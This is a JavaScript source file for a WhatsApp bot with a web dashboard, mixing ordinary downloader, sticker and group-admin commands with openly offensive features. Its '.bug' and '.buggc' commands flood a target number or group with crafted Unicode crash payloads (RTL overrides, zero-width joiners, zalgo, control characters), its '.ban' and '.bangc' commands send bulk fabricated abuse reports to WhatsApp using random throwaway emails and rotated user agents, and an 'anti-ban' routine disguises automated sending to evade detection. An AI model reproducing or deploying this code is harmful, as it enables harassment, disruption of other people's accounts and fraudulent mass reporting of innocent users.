// language: JavaScript, file: index.js
const express = require('express');
const pino = require('pino');
const QRCode = require('qrcode');
const axios = require('axios');
const sharp = require('sharp');
const fs = require('fs');
const path = require('path');
const { default: makeWASocket, useMultiFileAuthState, delay, fetchLatestBaileysVersion, DisconnectReason, downloadMediaMessage, getContentType } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const { Sticker, StickerTypes } = require('wa-sticker-formatter');

const app = express();
app.use(express.json());

let sock = null;
let status = 'disconnected';
let logs = [];
let currentQrBase64 = null;
let pairingCode = null;

// ── DATABASE LOKAL ─────────────────────────────────────────────
const DB_FILE = path.join(__dirname, 'database.json');
let db = { users: {} };

function loadDB() {
  if (fs.existsSync(DB_FILE)) {
    try { db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8')); } catch (e) {}
  }
}
function saveDB() { fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2)); }
function getUser(jid) {
  if (!db.users[jid]) { db.users[jid] = { limit: 50, money: 1000, warning: 0 }; saveDB(); }
  return db.users[jid];
}

function log(msg) {
  const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
  console.log(line);
  logs.push(line);
  if (logs.length > 150) logs.shift();
}

const jid = n => n.replace(/[^\d]/g, '') + '@s.whatsapp.net';

// ── DAFTAR MENU ────────────────────────────────────────────────
const MENU_TEXT = `
╭┏━『 *ᴛᴏᴏʟꜱ* 』
┃
┣⌬ .menu
┣⌬ .ping
┣⌬ .limit
┗━━━━━━━◧

╭┏━『 *GACOR (SATSET)* 』
┃
┣⌬ .bug <nomor> <tipe>
┣⌬ .ban <nomor> <jumlah>
┣⌬ .buggc <tipe> (Bug grup ini)
┣⌬ .bangc <link> <jumlah> (Ban grup)
┗━━━━━━━◧

╭┏━『 *ᴅᴏᴡɴʟᴏᴀᴅ* 』
┃
┣⌬ .tt <link> (TikTok Video)
┣⌬ .tta <link> (TikTok Audio)
┣⌬ .ytmp4 <link> (YouTube Video)
┣⌬ .ytmp3 <link> (YouTube Audio)
┗━━━━━━━◧

╭┏━『 *ɢʀᴏᴜᴘ* 』
┃
┣⌬ .gc <nama grup> (Tag orangnya)
┣⌬ .kick (reply/tag)
┣⌬ .promote (reply/tag)
┣⌬ .demote (reply/tag)
┣⌬ .tagall <teks>
┗━━━━━━━◧

╭┏━『 *ᴍᴀᴋᴇʀ & ᴀɪ* 』
┃
┣⌬ .ai <teks>
┣⌬ .aiimg <teks>
┣⌬ .sticker (reply foto/video)
┣⌬ .brat <teks>
┗━━━━━━━◧
`;

// ── BUG PAYLOAD GENERATOR ──────────────────────────────────────
const PAYLOADS = {
  bidi: () => '\u202e'.repeat(5000),
  zwj: () => '\u200d'.repeat(20000),
  control: () => { const c=Array.from({length:31},(_,i)=>String.fromCharCode(i+1)).filter(ch=>![9,10,13].includes(ch.charCodeAt(0))).join(''); return c.repeat(Math.floor(10000/c.length)); },
  mixed_rtl: () => { const p=['\u202e','\u202d','\u202c','\u2066','\u2067','\u2068','\u2069','a','\u0628','1']; return Array.from({length:8000},()=>p[Math.floor(Math.random()*p.length)]).join(''); },
  combining: () => ('a'+'\u0301'.repeat(500)).repeat(30),
  emoji_zwj: () => '\u{1F468}\u200D\u{1F469}\u200D\u{1F467}\u200D\u{1F466}'.repeat(500),
  zalgo: () => { const d=Array.from({length:0x6F},(_,i)=>String.fromCharCode(0x300+i)); let s=''; for(let i=0;i<400;i++){ s+='aeiou'[Math.floor(Math.random()*5)]; for(let j=0;j<50;j++) s+=d[Math.floor(Math.random()*d.length)]; } return s; },
};

// ── BAN SYSTEM (MASS REPORT) ───────────────────────────────────
const ABUSE_URL = "https://www.whatsapp.com/contact/noclient/";
const UA_POOL = [
  "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
];

function randEmail() {
  const dom = ["mailinator.com", "guerrillamail.com", "tempmail.com", "10minutemail.com"];
  return `r${Math.floor(Math.random()*999999)}@${dom[Math.floor(Math.random()*dom.length)]}`;
}

async function sendReport(target, reason) {
  const headers = {
    "User-Agent": UA_POOL[Math.floor(Math.random()*UA_POOL.length)],
    "Content-Type": "application/x-www-form-urlencoded",
  };
  const data = {
    email: randEmail(),
    subject: `Abuse report for ${target}`,
    description: `The WhatsApp account/group ${target} is engaged in ${reason}. This account/group is repeatedly spamming and scamming other users. Please review and take appropriate action.`,
    country: "ID",
    platform: ["android", "ios", "web"][Math.floor(Math.random()*3)],
  };
  try {
    const res = await axios.post(ABUSE_URL, new URLSearchParams(data).toString(), { headers, timeout: 15000 });
    return res.status;
  } catch (e) {
    return e.response ? e.response.status : "ERR";
  }
}

// ── ANTI-BAN SYSTEM ────────────────────────────────────────────
const humanDelay = (min = 1000, max = 3000) => new Promise(res => setTimeout(res, Math.floor(Math.random() * (max - min + 1)) + min));

async function safeSend(from, content, isMedia = false, quoted = null) {
  try {
    await humanDelay(1000, 3000);
    if (!isMedia) {
      await sock.sendPresenceUpdate('composing', from);
      await humanDelay(2000, 5000);
      await sock.sendPresenceUpdate('paused', from);
    }
    if (content.text) {
      content.text = content.text + '\u200b'.repeat(Math.floor(Math.random() * 20) + 1);
    }
    const opts = quoted ? { quoted } : {};
    return await sock.sendMessage(from, content, opts);
  } catch (err) { log(`Anti-Ban Error: ${err.message}`); }
}

// ── FUNGSI PENDUKUNG ───────────────────────────────────────────
async function askAI(prompt) {
  const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`);
  return res.data;
}

async function generateBrat(text) {
  const safeText = text.replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const svg = `<svg width="512" height="512"><rect width="100%" height="100%" fill="white"/><text x="50%" y="50%" font-family="Arial" font-weight="bold" font-size="45" fill="black" text-anchor="middle" dominant-baseline="middle">${safeText}</text></svg>`;
  return await sharp(Buffer.from(svg)).png().toBuffer();
}

async function applyFilter(buffer, type) {
  let img = sharp(buffer);
  if (type === 'blur') img = img.blur(15);
  if (type === 'grayscale') img = img.grayscale();
  return await img.jpeg({ quality: 80 }).toBuffer();
}

async function getMediaBuffer(msg) {
  const type = getContentType(msg.message);
  if (type === 'imageMessage' || type === 'videoMessage') {
    return await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
  }
  if (type === 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo?.quotedMessage) {
    const quoted = msg.message.extendedTextMessage.contextInfo.quotedMessage;
    const quotedType = getContentType(quoted);
    if (quotedType === 'imageMessage' || quotedType === 'videoMessage') {
      const reconstructed = {
        key: { remoteJid: msg.key.remoteJid, id: msg.message.extendedTextMessage.contextInfo.stanzaId, participant: msg.message.extendedTextMessage.contextInfo.participant },
        message: quoted
      };
      return await downloadMediaMessage(reconstructed, 'buffer', {}, { logger: pino({ level: 'silent' }) });
    }
  }
  return null;
}

function getTarget(msg) {
  const contextInfo = msg.message.extendedTextMessage?.contextInfo;
  if (!contextInfo) return null;
  return contextInfo.participant || contextInfo.mentionedJid?.[0] || null;
}

// ── BOT ENGINE ─────────────────────────────────────────────────
async function startBot() {
  loadDB();
  const { state, saveCreds } = await useMultiFileAuthState('auth');
  const { version } = await fetchLatestBaileysVersion();

  sock = makeWASocket({
    version, auth: state, logger: pino({ level: 'silent' }),
    printQRInTerminal: false, browser: ['Ubuntu', 'Chrome', '120.0.0.0']
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (u) => {
    const { connection, lastDisconnect, qr } = u;
    if (qr) { currentQrBase64 = await QRCode.toDataURL(qr); status = 'waiting_qr'; }
    if (connection === 'open') {
      status = 'connected'; currentQrBase64 = null; pairingCode = null;
      log('✅ Bot Gacor berhasil terhubung.');
    }
    if (connection === 'close') {
      status = 'disconnected';
      const code = new Boom(lastDisconnect?.error)?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut) { setTimeout(startBot, 3000); }
      else { log('❌ Logged out. Hapus auth/ lalu scan ulang.'); }
    }
  });

  sock.ev.on('messages.upsert', async (m) => {
    if (m.type !== 'notify') return;
    const msg = m.messages[0];
    if (!msg.message || msg.key.fromMe) return;

    const from = msg.key.remoteJid;
    const isGroup = from.endsWith('@g.us');
    const sender = isGroup ? msg.key.participant : from;
    const pushname = msg.pushName || 'User';
    
    await sock.readMessages([msg.key]);

    const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
    if (!text.startsWith('.')) return;

    const args = text.slice(1).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();
    const q = args.join(' ');
    const user = getUser(sender);

    log(`CMD [${pushname}]: ${cmd}`);

    try {
      if (cmd === 'menu') { await safeSend(from, { text: MENU_TEXT }, false, msg); }
      else if (cmd === 'ping') {
        const t1 = Date.now();
        await safeSend(from, { text: '🏓 Pong! ' + (Date.now() - t1) + 'ms' }, false, msg);
      }
      else if (cmd === 'limit') { await safeSend(from, { text: `👤 *${pushname}*\n💳 Limit: ${user.limit}\n💰 Uang: ${user.money}\n⚠️ Warn: ${user.warning}` }, false, msg); }
      
      // ── FITUR DOWNLOAD ──
      else if (cmd === 'tt' || cmd === 'tiktok') {
        if (!q) return safeSend(from, { text: 'Format: .tt <link tiktok>' }, false, msg);
        await safeSend(from, { text: '⏳ Mengunduh video TikTok...' }, false, msg);
        try {
          const res = await axios.get(`https://www.tikwm.com/api/?url=${encodeURIComponent(q)}`);
          if (res.data.code !== 0) throw new Error('Gagal mengambil video.');
          await safeSend(from, { video: { url: res.data.data.play }, caption: `🎬 *TikTok Video*\n\n📝 ${res.data.data.title}` }, true, msg);
        } catch (err) { await safeSend(from, { text: `❌ Error: ${err.message}` }, false, msg); }
      }
      else if (cmd === 'tta' || cmd === 'ttaudio') {
        if (!q) return safeSend(from, { text: 'Format: .tta <link tiktok>' }, false, msg);
        await safeSend(from, { text: '⏳ Mengunduh audio TikTok...' }, false, msg);
        try {
          const res = await axios.get(`https://www.tikwm.com/api/?url=${encodeURIComponent(q)}`);
          if (res.data.code !== 0) throw new Error('Gagal mengambil audio.');
          await safeSend(from, { audio: { url: res.data.data.music_info.play }, mimetype: 'audio/mp4', caption: `🎵 *TikTok Audio*\n\n📝 ${res.data.data.title}` }, true, msg);
        } catch (err) { await safeSend(from, { text: `❌ Error: ${err.message}` }, false, msg); }
      }
      else if (cmd === 'ytmp4' || cmd === 'ytv') {
        if (!q) return safeSend(from, { text: 'Format: .ytmp4 <link youtube>' }, false, msg);
        await safeSend(from, { text: '⏳ Mengunduh video YouTube...' }, false, msg);
        try {
          const res = await axios.get(`https://api.agatz.xyz/api/ytmp4?url=${encodeURIComponent(q)}`);
          if (res.data.status !== 200) throw new Error('Gagal mengambil video.');
          await safeSend(from, { video: { url: res.data.data.url }, caption: `🎬 *YouTube Video*\n\n📝 ${res.data.data.title}` }, true, msg);
        } catch (err) { await safeSend(from, { text: `❌ Error: ${err.message}` }, false, msg); }
      }
      else if (cmd === 'ytmp3' || cmd === 'yta') {
        if (!q) return safeSend(from, { text: 'Format: .ytmp3 <link youtube>' }, false, msg);
        await safeSend(from, { text: '⏳ Mengunduh audio YouTube...' }, false, msg);
        try {
          const res = await axios.get(`https://api.agatz.xyz/api/ytmp3?url=${encodeURIComponent(q)}`);
          if (res.data.status !== 200) throw new Error('Gagal mengambil audio.');
          await safeSend(from, { audio: { url: res.data.data.url }, mimetype: 'audio/mp4', caption: `🎵 *YouTube Audio*\n\n📝 ${res.data.data.title}` }, true, msg);
        } catch (err) { await safeSend(from, { text: `❌ Error: ${err.message}` }, false, msg); }
      }

      // ── FITUR BUAT GRUP ──
      else if (cmd === 'gc' || cmd === 'creategroup' || cmd === 'buatgrup') {
        if (!q) return safeSend(from, { text: 'Format: .gc Nama Grup (Tag orang yang mau diajak)' }, false, msg);
        await safeSend(from, { text: '⏳ Membuat grup baru...' }, false, msg);
        try {
          const mentions = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
          const group = await sock.groupCreate(q, mentions);
          const code = await sock.groupInviteCode(group.id);
          const link = `https://chat.whatsapp.com/${code}`;
          await safeSend(from, { text: `✅ *Grup Berhasil Dibuat!*\n\n📌 Nama: ${q}\n🔗 Link: ${link}` }, false, msg);
        } catch (err) {
          await safeSend(from, { text: `❌ Gagal buat grup: ${err.message}` }, false, msg);
        }
      }

      // ── FITUR BUG NOMOR ──
      else if (cmd === 'bug') {
        const target = args[0];
        const type = args[1] || 'bidi';
        if (!target) return safeSend(from, { text: 'Format: .bug 628xxx bidi' }, false, msg);
        if (!PAYLOADS[type]) return safeSend(from, { text: '❌ Tipe bug salah. Pilih: bidi, zwj, control, mixed_rtl, combining, emoji_zwj, zalgo' }, false, msg);
        
        await safeSend(from, { text: `🚀 Mengirim bug ${type} ke ${target}...` }, false, msg);
        const payload = PAYLOADS[type]();
        for (let i = 0; i < 3; i++) {
          await sock.sendMessage(jid(target), { text: payload });
          await delay(1500);
        }
        await safeSend(from, { text: `✅ Bug ${type} berhasil ditembakkan ke ${target}.` }, false, msg);
      }

      // ── FITUR BUG GRUP ──
      else if (cmd === 'buggc') {
        if (!isGroup) return safeSend(from, { text: '❌ Perintah ini cuma bisa dipake di dalam grup!' }, false, msg);
        const type = args[0] || 'zalgo';
        if (!PAYLOADS[type]) return safeSend(from, { text: '❌ Tipe bug salah.' }, false, msg);
        
        await safeSend(from, { text: `💀 Menghancurkan grup ini dengan ${type}...` }, false, msg);
        const payload = PAYLOADS[type]();
        for (let i = 0; i < 5; i++) {
          await sock.sendMessage(from, { text: payload });
          await delay(1000);
        }
        await safeSend(from, { text: `✅ Grup berhasil dihancurkan.` }, false, msg);
      }

      // ── FITUR BAN NOMOR ──
      else if (cmd === 'ban') {
        const target = args[0];
        const count = parseInt(args[1]) || 5;
        if (!target) return safeSend(from, { text: 'Format: .ban 628xxx 10' }, false, msg);
        if (count > 50) return safeSend(from, { text: '❌ Maksimal 50 report sekali jalan biar IP Railway ga diblokir.' }, false, msg);

        await safeSend(from, { text: `⏳ Mengirim ${count} report abuse ke WhatsApp untuk ${target}...` }, false, msg);
        let ok = 0, fail = 0;
        for (let i = 0; i < count; i++) {
          const stat = await sendReport(target, "spam and scam");
          if (stat === 200 || stat === 302) ok++; else fail++;
          await delay(3000);
        }
        await safeSend(from, { text: `✅ Selesai!\nBerhasil: ${ok}\nGagal: ${fail}\n\n_*Note:* Kalau gagal semua, IP server Railway lo udah diblokir WA.` }, false, msg);
      }

      // ── FITUR BAN GRUP ──
      else if (cmd === 'bangc') {
        const link = args[0];
        const count = parseInt(args[1]) || 5;
        if (!link || !link.includes('chat.whatsapp.com')) return safeSend(from, { text: 'Format: .bangc https://chat.whatsapp.com/xxx 10' }, false, msg);
        if (count > 50) return safeSend(from, { text: '❌ Maksimal 50 report sekali jalan.' }, false, msg);

        await safeSend(from, { text: `⏳ Mengirim ${count} report abuse untuk grup tersebut...` }, false, msg);
        let ok = 0, fail = 0;
        for (let i = 0; i < count; i++) {
          const stat = await sendReport(link, "sharing pornografi, perjudian, dan penipuan");
          if (stat === 200 || stat === 302) ok++; else fail++;
          await delay(3000);
        }
        await safeSend(from, { text: `✅ Selesai!\nBerhasil: ${ok}\nGagal: ${fail}` }, false, msg);
      }

      else if (cmd === 'ai') {
        if (!q) return safeSend(from, { text: 'Format: .ai siapa presiden indonesia?' }, false, msg);
        await safeSend(from, { text: '⏳ Mikir...' }, false, msg);
        const ans = await askAI(q);
        await safeSend(from, { text: ans }, false, msg);
      }
      else if (cmd === 'aiimg') {
        if (!q) return safeSend(from, { text: 'Format: .aiimg kucing pakai jas' }, false, msg);
        await safeSend(from, { text: '⏳ Menggambar...' }, false, msg);
        const imgUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(q)}?width=1024&height=1024&nologo=true`;
        await safeSend(from, { image: { url: imgUrl }, caption: q }, true, msg);
      }
      else if (cmd === 'sticker' || cmd === 's') {
        const media = await getMediaBuffer(msg);
        if (!media) return safeSend(from, { text: '❌ Reply (balas) sebuah foto/video pendek dengan perintah .sticker' }, false, msg);
        await safeSend(from, { text: '⏳ Membuat stiker...' }, false, msg);
        const sticker = new Sticker(media, { pack: 'Bot', author: pushname, type: StickerTypes.FULL });
        await safeSend(from, { sticker: await sticker.toBuffer() }, true, msg);
      }
      else if (cmd === 'brat') {
        if (!q) return safeSend(from, { text: 'Format: .brat teksnya' }, false, msg);
        const img = await generateBrat(q);
        const sticker = new Sticker(img, { pack: 'Bot', author: 'Brat', type: StickerTypes.FULL });
        await safeSend(from, { sticker: await sticker.toBuffer() }, true, msg);
      }
      else if (['waifu', 'neko', 'shinobu'].includes(cmd)) {
        const res = await axios.get(`https://api.waifu.pics/sfw/${cmd}`);
        await safeSend(from, { image: { url: res.data.url }, caption: `Ini ${cmd} nya~` }, true, msg);
      }
      else if (['blur', 'grayscale'].includes(cmd)) {
        const media = await getMediaBuffer(msg);
        if (!media) return safeSend(from, { text: '❌ Reply (balas) sebuah foto dengan perintah ini' }, false, msg);
        await safeSend(from, { text: '⏳ Memproses...' }, false, msg);
        const filtered = await applyFilter(media, cmd);
        await safeSend(from, { image: filtered, caption: `Efek ${cmd} selesai.` }, true, msg);
      }
      else if (['kick', 'promote', 'demote'].includes(cmd) && isGroup) {
        const meta = await sock.groupMetadata(from);
        const isAdmin = meta.participants.find(p => p.id === sender)?.admin;
        if (!isAdmin) return safeSend(from, { text: '❌ Khusus Admin!' }, false, msg);
        
        const target = getTarget(msg);
        if (!target) return safeSend(from, { text: 'Reply pesannya atau tag orangnya!' }, false, msg);
        
        await sock.groupParticipantsUpdate(from, [target], cmd === 'kick' ? 'remove' : cmd);
        await safeSend(from, { text: `✅ Target berhasil di-${cmd}` }, false, msg);
      }
      else if (cmd === 'tagall' && isGroup) {
        const meta = await sock.groupMetadata(from);
        const mentions = meta.participants.map(p => p.id);
        await safeSend(from, { text: `📢 ${q || 'Halo!'}\n\n${mentions.map(m => '@'+m.split('@')[0]).join(' ')}`, mentions }, false, msg);
      }
    } catch (err) { log(`Error: ${err.message}`); }
  });
}

// ── WEB DASHBOARD ──────────────────────────────────────────────
const HTML = String.raw`<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WA Bot Gacor</title>
<style>:root{--bg:#0d1117;--panel:#161b22;--line:#30363d;--txt:#e6edf3;--dim:#8b949e;--acc:#58a6ff;--ok:#3fb950;--err:#f85149}*{box-sizing:border-box}body{margin:0;font:14px/1.5 monospace;background:var(--bg);color:var(--txt)}header{padding:16px 24px;border-bottom:1px solid var(--line);display:flex;justify-content:space-between}.status{padding:4px 10px;border-radius:12px;font-size:12px;font-weight:bold}.connected{color:var(--ok);border:1px solid var(--ok)}.disconnected,.waiting_qr{color:var(--err);border:1px solid var(--err)}.main{padding:24px;max-width:800px;margin:0 auto;display:grid;gap:20px}.panel{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:16px}input,button{width:100%;padding:10px;background:var(--bg);color:var(--txt);border:1px solid var(--line);border-radius:4px;margin-top:8px}button{background:var(--acc);color:#fff;font-weight:bold;cursor:pointer}#log{background:#000;padding:12px;border-radius:4px;font-size:12px;height:200px;overflow-y:auto;white-space:pre-wrap;color:var(--ok)}#auth-section{display:none;text-align:center}#qr-img{width:250px;height:250px;margin:10px auto;border:5px solid #fff;border-radius:8px}#pair-code{font-size:28px;font-weight:bold;letter-spacing:5px;color:var(--acc);margin:10px 0}</style></head>
<body><header><h1>🤖 WA Bot Gacor</h1><div class="status disconnected" id="stat">checking...</div></header>
<div class="main">
<div class="panel" id="auth-section"><h3>Hubungkan WhatsApp</h3><img id="qr-img" src=""><div id="pair-code"></div><hr style="border-color:#30363d;margin:20px 0"><input id="phone" placeholder="Nomor Bot (628xxx)"><button onclick="requestPair()">Dapatkan Kode Pairing</button></div>
<div class="panel"><h3>Kirim Pesan (Manual)</h3><input id="target" placeholder="Target (628xxx)"><input id="msg" placeholder="Pesan"><button onclick="sendMsg()">Kirim</button></div>
<div class="panel"><h3>Live Logs</h3><div id="log">Menunggu...</div></div>
</div><script>
setInterval(async()=>{try{const r=await fetch('/api/status');const d=await r.json();document.getElementById('stat').textContent=d.status;document.getElementById('stat').className='status '+d.status;document.getElementById('log').textContent=d.logs.join('\n');document.getElementById('log').scrollTop=9999;const a=document.getElementById('auth-section');if(d.status==='disconnected'||d.status==='waiting_qr'){a.style.display='block';if(d.qr)document.getElementById('qr-img').src=d.qr;if(d.pairCode)document.getElementById('pair-code').textContent=d.pairCode;}else{a.style.display='none';}}catch(e){}},2000);
async function requestPair(){const p=document.getElementById('phone').value;if(!p)return alert('Isi nomor!');const r=await fetch('/api/pair',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p})});const d=await r.json();if(!d.ok)alert(d.error);}
async function sendMsg(){const t=document.getElementById('target').value;const m=document.getElementById('msg').value;if(!t||!m)return alert('Isi semua!');const r=await fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:t,text:m})});const d=await r.json();alert(d.ok?'Terkirim!':'Gagal: '+d.error);}
</script></body></html>`;

app.get('/', (req, res) => res.type('html').send(HTML));
app.get('/api/status', (req, res) => res.json({ status, logs, qr: currentQrBase64, pairCode: pairingCode }));
app.post('/api/pair', async (req, res) => {
  if (status === 'connected') return res.json({ ok: false, error: 'Sudah terhubung' });
  try { const code = await sock.requestPairingCode(req.body.phone.replace(/[^\d]/g, '')); pairingCode = code; res.json({ ok: true }); } 
  catch (e) { res.json({ ok: false, error: e.message }); }
});
app.post('/api/send', async (req, res) => {
  try { await safeSend(jid(req.body.target), { text: req.body.text }); res.json({ ok: true }); } 
  catch (e) { res.json({ ok: false, error: e.message }); }
});

const PORT = process.env.PORT || 3000;
startBot();
app.listen(PORT, () => log(`🌐 Web Dashboard jalan di port ${PORT}`));